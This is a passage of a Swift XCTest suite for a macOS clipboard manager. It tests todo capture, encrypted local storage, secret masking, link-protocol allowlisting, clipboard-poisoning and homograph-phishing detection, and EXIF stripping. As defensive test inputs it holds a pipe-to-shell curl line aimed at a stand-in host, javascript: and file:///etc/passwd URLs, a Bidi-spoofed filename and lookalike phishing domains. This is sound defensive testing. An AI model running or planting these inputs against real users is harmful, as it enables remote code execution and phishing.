        // 出血边距区域内点击必须 100% 穿透返回 nil，卡片内部正常命中
        XCTAssertNil(bleedRoot.hitTest(NSPoint(x: 10, y: 10)))
        XCTAssertNil(bleedRoot.hitTest(NSPoint(x: 485, y: 625)))
        XCTAssertNil(bleedRoot.hitTest(NSPoint(x: 35, y: 300)))
        XCTAssertEqual(bleedRoot.hitTest(NSPoint(x: 200, y: 300)), cardChild)

        // 连续圆角遮罩四角外缘必须为全透明（Alpha = 0），中心必须不透明（Alpha = 1）
        let mask = LiquidGlassSurfaceHost.continuousCornerMaskImage(size: NSSize(width: 120, height: 120), radius: 26)
        guard let rep = mask.representations.first as? NSBitmapImageRep else {
            XCTFail("应生成高清位图遮罩表示")
            return
        }
        XCTAssertEqual(rep.colorAt(x: 1, y: 1)?.alphaComponent ?? 1, 0, accuracy: 0.001)
        XCTAssertEqual(rep.colorAt(x: rep.pixelsWide - 2, y: rep.pixelsHigh - 2)?.alphaComponent ?? 1, 0, accuracy: 0.001)
        XCTAssertEqual(rep.colorAt(x: rep.pixelsWide / 2, y: rep.pixelsHigh / 2)?.alphaComponent ?? 0, 1, accuracy: 0.001)
    }

    // MARK: - 40. 剪贴即待办（闪念待办零歧义解析、多行清单拆解、搜索词匹配与旧版 JSON 兼容）测试

    func testTodoLifecycleQuickCaptureChecklistAndLegacyCompat() throws {
        // 1. 闪念待办语法解析与数学减法 / 搜索词零冲突
        let t1 = try XCTUnwrap(QuickCaptureParser.parse(from: "[] 下午核对 Q3 报表"))
        XCTAssertTrue(t1.defaultTodo)
        XCTAssertFalse(t1.defaultPin)
        XCTAssertEqual(t1.bodyText, "下午核对 Q3 报表")

        let t2 = try XCTUnwrap(QuickCaptureParser.parse(from: "todo: 财务 :: 给法务发补充协议"))
        XCTAssertTrue(t2.defaultTodo)
        XCTAssertEqual(t2.customAlias, "财务")
        XCTAssertEqual(t2.bodyText, "给法务发补充协议")

        let t3 = try XCTUnwrap(QuickCaptureParser.parse(from: "- 修复圆角裁剪"))
        XCTAssertTrue(t3.defaultTodo)
        XCTAssertEqual(t3.bodyText, "修复圆角裁剪")

        // 数学续算减法、CLI 参数与搜索过滤词绝不误判为新建待办
        XCTAssertNil(QuickCaptureParser.parse(from: "- 50"))
        XCTAssertNil(QuickCaptureParser.parse(from: "-3.14"))
        XCTAssertNil(QuickCaptureParser.parse(from: "--help"))
        XCTAssertNil(QuickCaptureParser.parse(from: "@todo"))
        XCTAssertNil(QuickCaptureParser.parse(from: "@待办"))

        // 2. 多行清单提取（自动过滤已完成 `[x]` 项，排除代码块与纯金额）
        let markdownList = """
        - [ ] 核对发票税号
        - [x] 已同步官网下载包
        - [ ] 回复客户报价单
        """
        XCTAssertEqual(
            TodoChecklistExtractor.extractChecklistItems(from: markdownList),
            ["核对发票税号", "回复客户报价单"]
        )
        let numberedList = "1. 检查签名公证\n2. 运行双端回归测试\n3. 发布版本说明"
        XCTAssertEqual(TodoChecklistExtractor.extractChecklistItems(from: numberedList).count, 3)
        XCTAssertTrue(TodoChecklistExtractor.extractChecklistItems(from: "func test() {\n  return 1\n}").isEmpty)

        // 3. 单条行动意图识别
        XCTAssertTrue(TodoChecklistExtractor.hasActionableSingleTodoIntent("记得下班前把报销单发给财务"))
        XCTAssertFalse(TodoChecklistExtractor.hasActionableSingleTodoIntent("https://app.webfooo.com/iClip"))

        // 4. 待办状态检索词（@todo / 未完成 / 已完成）与持久化无损编码
        var item = ClipItem(type: .text, text: "回访重点客户", contentHash: "text:todo-1")
        XCTAssertFalse(item.isTodo)
        item.isTodo = true
        XCTAssertTrue(item.isPendingTodo)
        XCTAssertTrue(item.matches(query: "@todo"))
        XCTAssertTrue(item.matches(query: "未完成"))
        XCTAssertFalse(item.matches(query: "已完成"))

        let doneDate = Date(timeIntervalSince1970: 1_760_000_000)
        item.todoCompletedAt = doneDate
        XCTAssertTrue(item.isTodoCompleted)
        XCTAssertTrue(item.matches(query: "已完成"))
        XCTAssertFalse(item.matches(query: "未完成"))

        let encoded = try JSONEncoder().encode(item)
        let decoded = try JSONDecoder().decode(ClipItem.self, from: encoded)
        XCTAssertTrue(decoded.isTodoCompleted)
        XCTAssertEqual(decoded.todoCompletedAt, doneDate)

        // 5. 原位编辑（updatedItem）必须无损保留待办状态，且 Markdown 清单导出按「未完成 → 已完成」整齐输出
        let editedTodo = try XCTUnwrap(ClipboardStore.updatedItem(from: decoded, withNewText: "回访重点客户（已发合同）"))
        XCTAssertTrue(editedTodo.isTodoCompleted)

        let pendingLink = ClipItem(
            type: .link,
            text: "https://github.com/fanaruto/iClip/issues/1",
            contentHash: "link:issue-1",
            createdAt: Date(timeIntervalSince1970: 1_760_000_500),
            customAlias: "处理线上反馈",
            isTodoItem: true
        )
        let markdownOut = try XCTUnwrap(ClipboardStore.formatTodosAsMarkdownChecklist(from: [editedTodo, pendingLink]))
        XCTAssertEqual(
            markdownOut,
            "- [ ] 处理线上反馈 — https://github.com/fanaruto/iClip/issues/1\n- [x] 回访重点客户（已发合同）"
        )
    }

    // MARK: - 41. 零信任静态加密（旧明文平滑升级）、敏感凭据防肩窥雾化、全协议隐私拦截与跨软件一键无损搬家测试

    func testLocalVaultEncryptionSensitiveVeilAndUniversalCompetitorImport() throws {
        // 1. AES-256-GCM 静态加密与篡改防伪校验 + 旧明文自动升级密文 + 0600 权限锁死
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-vault-test-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let primaryURL = tempDir.appendingPathComponent("history.json")
        let backupURL = tempDir.appendingPathComponent("history.backup.json")
        let corruptURL = tempDir.appendingPathComponent("history.corrupt.json")

        let secretText = "sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz1234569xQ2"
        let sampleItem = ClipItem(type: .text, text: secretText, contentHash: "text:sec-1")

        // 先模拟历史遗留的未加密明文 history.json
        let legacyPlain = try JSONEncoder().encode([sampleItem])
        try legacyPlain.write(to: primaryURL)
        XCTAssertFalse(try Data(contentsOf: primaryURL).starts(with: LocalVaultCrypto.magicHeader))

        // 加载旧明文必须 100% 无损读取，并自动原地重写升级为 ICLPENC1 密文且锁死 0600 权限
        let migratedOutcome = HistoryPersistenceHelper.loadSnapshot(
            primaryURL: primaryURL,
            backupURL: backupURL,
            corruptURL: corruptURL
        )
        XCTAssertEqual(migratedOutcome.items.first?.text, secretText)

        let upgradedOnDisk = try Data(contentsOf: primaryURL)
        XCTAssertTrue(upgradedOnDisk.starts(with: LocalVaultCrypto.magicHeader))
        XCTAssertNil(String(data: upgradedOnDisk, encoding: .utf8)?.contains(secretText) == true ? "leaked" : nil)

        let perms = (try FileManager.default.attributesOfItem(atPath: primaryURL.path)[.posixPermissions] as? NSNumber)?.intValue
        XCTAssertEqual(perms, 0o600)

        // 篡改主密文任意 1 个字节必须触发 GCM Tag 鉴权失败，并自动从完好加密备份无损自愈
        var tampered = upgradedOnDisk
        tampered[tampered.count - 4] ^= 0xFF
        try tampered.write(to: primaryURL)
        let healed = HistoryPersistenceHelper.loadSnapshot(
            primaryURL: primaryURL,
            backupURL: backupURL,
            corruptURL: corruptURL
        )
        if case .recoveredFromBackup(let rec) = healed {
            XCTAssertEqual(rec.first?.text, secretText)
        } else {
            XCTFail("篡改密文后应触发 GCM 验签拦截并从加密备份无损自愈")
        }

        // 2. 离线敏感凭据嗅探与防肩窥圆点雾化遮罩（零误伤普通句子，选中即显影原值）
        XCTAssertEqual(sampleItem.detectedSensitiveKind, .apiKey)
        let veiled = sampleItem.displayTitle(minimalMode: false, veilActive: true)
        XCTAssertTrue(veiled.contains("••••••••••••"))
        XCTAssertTrue(veiled.hasSuffix("9xQ2"))
        XCTAssertFalse(veiled.contains("AbCdEfGhIjKl"))
        XCTAssertEqual(sampleItem.displayTitle(minimalMode: false, veilActive: false), secretText)

        let normalNote = ClipItem(type: .text, text: "明天上午十点评审季度产品路线图", contentHash: "text:norm")
        XCTAssertNil(normalNote.detectedSensitiveKind)
        XCTAssertEqual(normalNote.displayTitle(minimalMode: false, veilActive: true), "明天上午十点评审季度产品路线图")

        // 3. 密码管理器与自动化临时剪贴板全协议识别
        XCTAssertEqual(
            PasteboardPrivacyStandards.inspect(types: [NSPasteboard.PasteboardType("com.agilebits.onepassword")]),
            .rejectConcealedSecret
        )
        XCTAssertEqual(
            PasteboardPrivacyStandards.inspect(types: [.string], frontmostBundleID: "com.apple.Passwords"),
            .rejectConcealedSecret
        )
        XCTAssertEqual(
            PasteboardPrivacyStandards.inspect(types: [NSPasteboard.PasteboardType("org.nspasteboard.AutoGeneratedType")]),
            .rejectTransientAutomation
        )
        XCTAssertEqual(
            PasteboardPrivacyStandards.inspect(types: [.string], frontmostBundleID: "com.apple.Safari"),
            .allowCapture
        )

        // 4. 口令加密 `.iclip` 归档与跨软件一键无损搬家（Raycast Snippets JSON + Excel CSV 常用语表）
        var pinnedSample = sampleItem
        pinnedSample.isPinned = true
        pinnedSample.customAlias = "生产环境 OpenAI 密钥"
        let encArchive = try ArchiveBackupService.exportPinnedArchiveData(
            from: [pinnedSample],
            imagesDirectoryURL: tempDir,
            passphrase: "MyStrongVaultPass#2026"
        )
        XCTAssertTrue(LocalVaultCrypto.isEncryptedArchive(encArchive))
        XCTAssertThrowsError(try ArchiveBackupService.mergeArchiveData(encArchive, into: [], imagesDirectoryURL: tempDir, passphrase: "wrong"))
        let (decMerged, decSum) = try ArchiveBackupService.mergeArchiveData(
            encArchive,
            into: [],
            imagesDirectoryURL: tempDir,
            passphrase: "MyStrongVaultPass#2026"
        )
        XCTAssertEqual(decSum.importedNewCount, 1)
        XCTAssertEqual(decMerged.first?.customAlias, "生产环境 OpenAI 密钥")

        let raycastJSON = Data(#"""
        [
          {"name": "公司开票抬头", "text": "上海怀道科技有限公司 91310115MA1K99882X", "keyword": "!fp"},
          {"name": "产品官网", "text": "https://app.webfooo.com/iClip", "keyword": "!site"}
        ]
        """#.utf8)
        let (rayMerged, raySum) = try ArchiveBackupService.mergeArchiveData(
            raycastJSON,
            into: [],
            imagesDirectoryURL: tempDir,
            fileExtensionHint: "json"
        )
        XCTAssertEqual(raySum.sourceFormatLabel, "Raycast 常用语")
        XCTAssertEqual(raySum.importedNewCount, 2)
        XCTAssertEqual(rayMerged[0].pinCategory, .invoice)
        XCTAssertEqual(rayMerged[1].type, .link)

        let csvData = Data("备注,内容\n收货地址,\"上海市浦东新区张江高科园区, 88号\"\n售后欢迎语,您好，请问有什么可以帮您？\n".utf8)
        let (csvMerged, csvSum) = try ArchiveBackupService.mergeArchiveData(
            csvData,
            into: rayMerged,
            imagesDirectoryURL: tempDir,
            fileExtensionHint: "csv"
        )
        XCTAssertEqual(csvSum.sourceFormatLabel, "CSV 常用语表")
        XCTAssertEqual(csvSum.importedNewCount, 2)
        XCTAssertEqual(csvMerged.count, 4)
    }

    // MARK: - 41. 红队安全闭环回归（备注副标题防泄密、外部 URL 协议白名单、身份证/银行卡校验遮罩、外发 AI 防泄密置顶与 @敏感 快筛）

    @MainActor
    func testRedTeamSubtitleVeilURLProtocolGuardAndAIOutboundRedaction() throws {
        // 1. 备注名卡片副标题防泄密：开启遮罩时既保留用户备注标题，又把副标题中的明文密钥雾化遮罩
        let secretRaw = "sk-proj-RedTeamLeakCheck9876543210XyZ1"
        let aliasedSecret = ClipItem(
            type: .text,
            text: secretRaw,
            contentHash: "text:rt-alias",
            customAlias: "主站 OpenAI 生产密钥"
        )
        XCTAssertEqual(aliasedSecret.displayTitle(minimalMode: false, veilActive: true), "主站 OpenAI 生产密钥")
        let veiledSub = aliasedSecret.subtitleInfo(veilActive: true)
        XCTAssertTrue(veiledSub.contains("••••••••••••"))
        XCTAssertFalse(veiledSub.contains("RedTeamLeakCheck"))
        XCTAssertTrue(aliasedSecret.subtitleInfo(veilActive: false).contains("sk-proj-"))

        // 2. 外部浏览器跳转严格 http/https 白名单：拦截危险伪协议，保留合法网页与 localhost:port
        XCTAssertNil(OutboundLinkSafety.validatedBrowserURL(from: "javascript:alert(document.cookie)"))
        XCTAssertNil(OutboundLinkSafety.validatedBrowserURL(from: "file:///etc/passwd"))
        XCTAssertNil(OutboundLinkSafety.validatedBrowserURL(from: "ms-msdt:id=PCWDiagnostic"))
        XCTAssertNil(OutboundLinkSafety.validatedBrowserURL(from: "search-ms:query=secret"))
        XCTAssertNil(OutboundLinkSafety.validatedBrowserURL(from: "ssh://root@10.0.0.1"))
        XCTAssertNil(OutboundLinkSafety.validatedBrowserURL(from: "/Users/fanaruto/.ssh/id_ed25519"))
        XCTAssertEqual(
            OutboundLinkSafety.validatedBrowserURL(from: "localhost:5173/dashboard")?.absoluteString,
            "http://localhost:5173/dashboard"
        )
        XCTAssertEqual(
            OutboundLinkSafety.validatedBrowserURL(from: "app.webfooo.com/iClip")?.absoluteString,
            "https://app.webfooo.com/iClip"
        )

        // 3. 18 位身份证（GB 11643 校验位）与银行卡（Luhn 校验）防肩窥遮罩（零误伤普通 18 位错位订单号）
        let validIDItem = ClipItem(type: .text, text: "报销人身份证：110101199003077758", contentHash: "text:id-ok")
        XCTAssertEqual(validIDItem.detectedSensitiveKind, .personalIdentity)
        let fakeOrderItem = ClipItem(type: .text, text: "订单流水号：110101199003077759", contentHash: "text:id-fake")
        XCTAssertNil(fakeOrderItem.detectedSensitiveKind)

        let validCardItem = ClipItem(type: .text, text: "打款卡号 6222021234567894", contentHash: "text:card-ok")
        XCTAssertEqual(validCardItem.detectedSensitiveKind, .personalIdentity)
        let redactedMix = SensitiveCredentialVeil.redactForExternalSharing(
            "请核对：身份证 110101199003077758，卡号 6222021234567894，Key=sk-proj-AbCdEfGhIjKlMnOpQrStUv1234"
        )
        XCTAssertFalse(redactedMix.contains("110101199003077758"))
        XCTAssertFalse(redactedMix.contains("6222021234567894"))
        XCTAssertFalse(redactedMix.contains("AbCdEfGhIjKlMnOpQrStUv1234"))
        XCTAssertTrue(redactedMix.contains("110***********7758"))
        XCTAssertTrue(redactedMix.contains("6222********7894"))

        // 4. `@敏感` / `@即焚` 1 秒安全盘点快筛与外部 AI 窗口自动置顶防泄密脱敏
        var burnNormal = ClipItem(type: .text, text: "一次性内部口令 9527", contentHash: "text:burn1", burnAfterPaste: true)
        XCTAssertTrue(validIDItem.matches(query: "@敏感"))
        XCTAssertTrue(aliasedSecret.matches(query: "@secret"))
        XCTAssertFalse(fakeOrderItem.matches(query: "@敏感"))
        XCTAssertTrue(burnNormal.matches(query: "@即焚"))
        XCTAssertTrue(burnNormal.matches(query: "@敏感"))
        burnNormal.burnAfterPaste = false
        XCTAssertFalse(burnNormal.matches(query: "@即焚"))

        XCTAssertTrue(SensitiveCredentialVeil.isExternalAIOrChatApp("ChatGPT"))
        XCTAssertTrue(SensitiveCredentialVeil.isExternalAIOrChatApp("微信"))
        XCTAssertFalse(SensitiveCredentialVeil.isExternalAIOrChatApp("Ghostty"))
    }

    // MARK: - 42. 本地截图全模态静态加密（`ICLPIMG1`）、含敏链接/图片 OCR 遮罩、OTA 源校验与 24h 自动老化测试

    @MainActor
    func testEncryptedImageVaultMultimodalVeilOTAGuardAndSecretAutoTTL() throws {
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-imgvault-\(UUID().uuidString)", isDirectory: true)
        let imgDir = tempDir.appendingPathComponent("images", isDirectory: true)
        let exportDir = tempDir.appendingPathComponent("exports", isDirectory: true)
        try FileManager.default.createDirectory(at: imgDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        // 1. 存量明文 PNG 原地升级为 `ICLPIMG1` 认证密文，且按需导出时解密还原原始字节、篡改密文自动拦截
        let fakePNG = Data([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0xDE, 0xAD, 0xBE, 0xEF])
        let legacyURL = imgDir.appendingPathComponent("legacy-idcard.png")
        try fakePNG.write(to: legacyURL)
        XCTAssertEqual(LocalVaultCrypto.readDecryptedImageData(at: legacyURL), fakePNG)

        let upgradedCount = LocalVaultCrypto.upgradePlainImagesInDirectoryIfNeeded(imgDir)
        XCTAssertEqual(upgradedCount, 1)
        let encryptedOnDisk = try Data(contentsOf: legacyURL)
        XCTAssertTrue(encryptedOnDisk.starts(with: LocalVaultCrypto.imageEncryptedMagic))
        XCTAssertNotEqual(encryptedOnDisk, fakePNG)
        XCTAssertEqual(LocalVaultCrypto.readDecryptedImageData(at: legacyURL), fakePNG)

        let imgItem = ClipItem(
            type: .image,
            imageFileName: "legacy-idcard.png",
            ocrText: "公民身份号码 110101199003077758",
            contentHash: "img:idcard",
            customAlias: "报销证件照"
        )
        let exported = try XCTUnwrap(
            DragFileExportHelper.materializeExportFile(
                for: imgItem,
                sourceImageURL: legacyURL,
                exportDirectory: exportDir
            )
        )
        XCTAssertEqual(try Data(contentsOf: exported.url), fakePNG)

        // 篡改密文末字节 -> GCM 认证拦截返回 nil
        var tampered = encryptedOnDisk
        tampered[tampered.count - 1] ^= 0xFF
        try tampered.write(to: legacyURL)
        XCTAssertNil(LocalVaultCrypto.readDecryptedImageData(at: legacyURL))

        // 2. 含敏链接（?api_key=）与含敏图片 OCR 副标题防肩窥遮罩
        let secretLink = ClipItem(
            type: .link,
            text: "https://api.service.io/v1/chat?api_key=VendorCustomSecretToken9876543210",
            contentHash: "link:sec"
        )
        XCTAssertEqual(secretLink.detectedSensitiveKind, .connectionSecret)
        XCTAssertTrue(secretLink.displayTitle(minimalMode: false, veilActive: true).contains("••••••••••••"))
        XCTAssertTrue(
            SensitiveCredentialVeil.redactForExternalSharing(secretLink.text ?? "").contains("api_key=***REDACTED***")
        )

        XCTAssertEqual(imgItem.detectedSensitiveKind, .personalIdentity)
        let veiledImgSub = imgItem.subtitleInfo(veilActive: true)
        XCTAssertTrue(veiledImgSub.contains("••••••••••••"))
        XCTAssertFalse(veiledImgSub.contains("110101199003077758"))

        // 3. OTA 远端更新源严格 HTTPS 域名白名单校验
        XCTAssertTrue(UpdateManager.isTrustedRemoteDownloadURL(URL(string: "https://github.com/fanaruto/iClip/releases/download/v2.6.0/iClip-Dev-macOS.zip")!))
        XCTAssertTrue(UpdateManager.isTrustedRemoteDownloadURL(URL(string: "https://app.webfooo.com/downloads/iClip/iClip-Dev-macOS.zip")!))
        XCTAssertFalse(UpdateManager.isTrustedRemoteDownloadURL(URL(string: "http://github.com/fanaruto/iClip/iClip.zip")!))
        XCTAssertFalse(UpdateManager.isTrustedRemoteDownloadURL(URL(string: "https://evil-mirror.example.com/iClip.zip")!))
    }

    // MARK: - 43. 截图局部晶格马赛克物理打码（`renderMosaicBoxes`）与归档大小上限守卫测试

    @MainActor
    func testImagePrivacyMosaicRenderingAndArchiveSizeGuard() throws {
        // 1. 构造一张左黑右白对比分明的 120x80 测试位图，在中心跨界框施加晶格马赛克，验证中心像素被均值化擦除而四角保持原样
        let w = 120, h = 80
        let cs = CGColorSpace(name: CGColorSpace.sRGB)!
        let ctx = try XCTUnwrap(CGContext(
            data: nil,
            width: w,
            height: h,
            bitsPerComponent: 8,
            bytesPerRow: 0,
            space: cs,
            bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
        ))
        ctx.setFillColor(CGColor(srgbRed: 0, green: 0, blue: 0, alpha: 1))
        ctx.fill(CGRect(x: 0, y: 0, width: w / 2, height: h))
        ctx.setFillColor(CGColor(srgbRed: 1, green: 1, blue: 1, alpha: 1))
        ctx.fill(CGRect(x: w / 2, y: 0, width: w / 2, height: h))
        let srcCG = try XCTUnwrap(ctx.makeImage())

        let mosaicOut = try XCTUnwrap(ImageStudioEngine.renderMosaicBoxes(
            [CGRect(x: 0.35, y: 0.25, width: 0.30, height: 0.50)],
            onto: srcCG
        ))
        XCTAssertEqual(mosaicOut.redactedCount, 1)
        XCTAssertGreaterThan(mosaicOut.result.byteCount, 64)
        let decodedSrc = try XCTUnwrap(CGImageSourceCreateWithData(mosaicOut.result.data as CFData, nil))
        let outCG = try XCTUnwrap(CGImageSourceCreateImageAtIndex(decodedSrc, 0, nil))
        XCTAssertEqual(outCG.width, w)
        XCTAssertEqual(outCG.height, h)

        // 2. 归档包超限守卫常量核验（64 MB）
        XCTAssertEqual(ArchiveBackupService.maxArchiveInputBytes, 64 * 1024 * 1024)
    }

    // MARK: - 44. 剪贴板投毒（Pastejacking / Trojan Bidi）、零宽幽灵字符净化与 Emoji 豁免及跨平台加密归档测试

    @MainActor
    func testPastejackingBidiGuardZeroWidthSanitizerAndCrossOSArchive() throws {
        // 1. Trojan Source Bidi 反转木马与终端 ANSI 控制序列劫持检测与净化
        let bidiSpoof = "invoice_\u{202E}fdp.scr"
        if case .pastejackingOrBidi = ClipboardPoisonGuard.inspect(bidiSpoof) {
            XCTAssertEqual(ClipboardPoisonGuard.sanitize(bidiSpoof), "invoice_fdp.scr")
        } else {
            XCTFail("必须识别 Bidi RLO 伪装控制符")
        }

        let pastejackCmd = "\u{001B}[31mcurl -s http://evil.example/x|sh\rgit status\n"
        if case .pastejackingOrBidi = ClipboardPoisonGuard.inspect(pastejackCmd) {
            let clean = ClipboardPoisonGuard.sanitize(pastejackCmd)
            XCTAssertFalse(clean.contains("\u{001B}"))
            XCTAssertFalse(clean.contains("\r"))
            XCTAssertFalse(clean.hasSuffix("\n")) // 尾随自动回车陷阱已被安全剥离
        } else {
            XCTFail("必须识别终端 ANSI / 同行回车覆盖劫持")
        }

        // 2. 网页零宽幽灵空格精准清除 vs 复合 Emoji ZWJ 100% 零误伤
        let ghostOrder = "ORD\u{200B}-2026\u{FEFF}-9981"
        XCTAssertEqual(ClipboardPoisonGuard.inspect(ghostOrder), .zeroWidthGhost(count: 2))
        XCTAssertEqual(ClipboardPoisonGuard.sanitize(ghostOrder), "ORD-2026-9981")

        let familyEmoji = "团队研发 🧑‍💻 家庭 👨‍👩‍👧‍👦 正常文本"
        XCTAssertNil(ClipboardPoisonGuard.inspect(familyEmoji))
        XCTAssertEqual(ClipboardPoisonGuard.sanitize(familyEmoji), familyEmoji)

        // 3. `@风险` / `@poison` 搜索快筛与 `ICLPAWIN1` 跨平台加密归档双向解封
        let poisonItem = ClipItem(type: .text, text: bidiSpoof, contentHash: "text:poison")
        XCTAssertTrue(poisonItem.matches(query: "@风险"))
        XCTAssertTrue(poisonItem.matches(query: "@敏感"))

        let rawPayload = Data("{\"cross_platform\":true}".utf8)
        let sealed = try XCTUnwrap(LocalVaultCrypto.sealArchiveWithPassphrase(rawPayload, passphrase: "SyncKey#88"))
        XCTAssertTrue(sealed.starts(with: LocalVaultCrypto.crossPlatformArchiveMagic))
        XCTAssertNil(LocalVaultCrypto.openEncryptedArchive(sealed, passphrase: "wrong"))
        XCTAssertEqual(LocalVaultCrypto.openEncryptedArchive(sealed, passphrase: "SyncKey#88"), rawPayload)
    }

    // MARK: - 45. 敏感私钥/凭据文件识别、同形异义钓鱼域名拦截与照片 GPS/EXIF 元数据物理剥离测试

    @MainActor
    func testSensitiveFileGuardHomographPhishingAndPhotoExifStrip() throws {
        // 1. 全四模态合拢：高危私钥/凭据配置文件识别与 `.pub` / `.env.example` 零误伤
        XCTAssertEqual(
            FileAndLinkSecurityGuard.classifyFilePaths(["/Users/dev/.ssh/id_ed25519"]),
            .privateKey
        )
        XCTAssertEqual(
            FileAndLinkSecurityGuard.classifyFilePaths(["/Users/dev/certs/client.p12"]),
            .privateKey
        )
        XCTAssertEqual(
            FileAndLinkSecurityGuard.classifyFilePaths(["/Users/dev/app/.env.production"]),
            .connectionSecret
        )
        XCTAssertEqual(
            FileAndLinkSecurityGuard.classifyFilePaths(["/Users/dev/vault/personal.kdbx"]),
            .connectionSecret
        )
        XCTAssertNil(FileAndLinkSecurityGuard.classifyFilePaths(["/Users/dev/.ssh/id_ed25519.pub"]))
        XCTAssertNil(FileAndLinkSecurityGuard.classifyFilePaths(["/Users/dev/app/.env.example"]))
        XCTAssertNil(FileAndLinkSecurityGuard.classifyFilePaths(["/Users/dev/Documents/报价单.pdf"]))

        let keyFileItem = ClipItem(
            type: .file,
            filePaths: ["/Users/dev/.ssh/id_rsa"],
            contentHash: "file:id_rsa"
        )
        XCTAssertEqual(keyFileItem.detectedSensitiveKind, .privateKey)
        XCTAssertTrue(keyFileItem.matches(query: "@敏感"))

        // 2. IDN Punycode / 西里尔混排钓鱼域名与非信任源可执行文件下载链接识别
        XCTAssertEqual(
            FileAndLinkSecurityGuard.inspectLinkRisk("https://xn--80ak6aa92e.com/login"),
            .homographPhishing
        )
        // 拉丁 `a` + 西里尔 `р` (`U+0440`) 混排伪装域名
        XCTAssertEqual(
            FileAndLinkSecurityGuard.inspectLinkRisk("https://a\u{0440}ple.com/security"),
            .homographPhishing
        )
        XCTAssertEqual(
            FileAndLinkSecurityGuard.inspectLinkRisk("https://apple.com@evil-login.net/auth"),
            .homographPhishing
        )
        XCTAssertEqual(
            FileAndLinkSecurityGuard.inspectLinkRisk("https://cdn-unknown-mirror.org/setup_patch.exe"),
            .executableDownload
        )
        // 官方 GitHub Release 下载直链与正常官网零误伤
        XCTAssertNil(FileAndLinkSecurityGuard.inspectLinkRisk("https://github.com/nekoyoubi/iClip/releases/download/v2.6.0/iClip-Setup.exe"))
        XCTAssertNil(FileAndLinkSecurityGuard.inspectLinkRisk("https://app.webfooo.com/iClip"))

        let phishItem = ClipItem(type: .link, text: "https://xn--80ak6aa92e.com/login", contentHash: "link:phish")
        XCTAssertEqual(phishItem.detectedLinkRisk, .homographPhishing)
        XCTAssertTrue(phishItem.matches(query: "@风险"))
        XCTAssertTrue(phishItem.matches(query: "@敏感"))

        // 3. 含 GPS 经纬度与相机 EXIF 元数据的照片检测与 100% 物理重绘剥离
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-exif-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let cs = CGColorSpace(name: CGColorSpace.sRGB) ?? CGColorSpaceCreateDeviceRGB()
        let ctx = try XCTUnwrap(CGContext(
            data: nil, width: 32, height: 32, bitsPerComponent: 8, bytesPerRow: 0,
            space: cs, bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
        ))
        ctx.setFillColor(CGColor(srgbRed: 0.2, green: 0.5, blue: 0.9, alpha: 1))
        ctx.fill(CGRect(x: 0, y: 0, width: 32, height: 32))
        let cg = try XCTUnwrap(ctx.makeImage())

        let photoWithGPS = tmpDir.appendingPathComponent("IMG_GPS.jpg")
        let jpgData = NSMutableData()
        let dest = try XCTUnwrap(CGImageDestinationCreateWithData(jpgData as CFMutableData, "public.jpeg" as CFString, 1, nil))
        let metaProps: [CFString: Any] = [
            kCGImagePropertyGPSDictionary: [
                kCGImagePropertyGPSLatitude: 31.2304,
                kCGImagePropertyGPSLongitude: 121.4737
            ],
            kCGImagePropertyTIFFDictionary: [
                kCGImagePropertyTIFFMake: "Apple",
                kCGImagePropertyTIFFModel: "iPhone 17 Pro"
            ]
        ]
        CGImageDestinationAddImage(dest, cg, metaProps as CFDictionary)
        XCTAssertTrue(CGImageDestinationFinalize(dest))
        try (jpgData as Data).write(to: photoWithGPS)

        XCTAssertTrue(ImageStudioEngine.fileContainsPrivacyMetadata(at: photoWithGPS))
        let stripped = try XCTUnwrap(ImageStudioEngine.stripPrivacyMetadata(at: photoWithGPS))
        let cleanURL = tmpDir.appendingPathComponent("IMG_CLEAN.png")
        try stripped.data.write(to: cleanURL)
        XCTAssertFalse(ImageStudioEngine.fileContainsPrivacyMetadata(at: cleanURL))
    }

    // MARK: - 46. 行为记忆库静态加密、删除哈希指纹遗忘、临时拖拽擦除、定时无痕暂停与 cURL Cookie/JWT 透视测试

    @MainActor
    func testEncryptedAdaptiveBrainHashForgetTimedPauseAndCurlCookieRedaction() throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-iter6-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        // 1. 验证旧明文 adaptive_intelligence.json 自动原地升级密文，且删除记录时彻底抹除 SHA-256 哈希指纹
        let brainFile = tmpDir.appendingPathComponent("adaptive_intelligence.json")
        let legacyPlain = Data("""
        {"sparkEnabled":true,"sparkDurationSeconds":2,"recentReuseCounts":{"text:secret_hash_1":4,"text:keep_hash":2},"recentReuseOrder":["text:secret_hash_1","text:keep_hash"],"targetAppPasteCounts":{"chatgpt":{"text:secret_hash_1":3}},"targetAppDisplayNames":{"chatgpt":"ChatGPT"},"actionWeights":{},"appActionWeights":{},"actionAcceptCounts":{},"categoryDismissStreaks":{},"enabledAutoRules":[],"declinedAutoRules":[],"mutedSourceApps":[],"totalLearnedInteractions":5}
        """.utf8)
        try legacyPlain.write(to: brainFile)

        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tmpDir)
        XCTAssertEqual(engine.reuseCount(for: "text:secret_hash_1"), 4)
        XCTAssertEqual(engine.targetAppPasteCount(for: "text:secret_hash_1", targetApp: "chatgpt"), 3)

        engine.forgetContentHashes(["text:secret_hash_1"])
        XCTAssertEqual(engine.reuseCount(for: "text:secret_hash_1"), 0)
        XCTAssertEqual(engine.targetAppPasteCount(for: "text:secret_hash_1", targetApp: "chatgpt"), 0)
        XCTAssertEqual(engine.reuseCount(for: "text:keep_hash"), 2)

        // 2. 验证拖拽明文临时导出文件在删除单条与全量擦除时立即销毁
        let exportDir = tmpDir.appendingPathComponent("drag_exports", isDirectory: true)
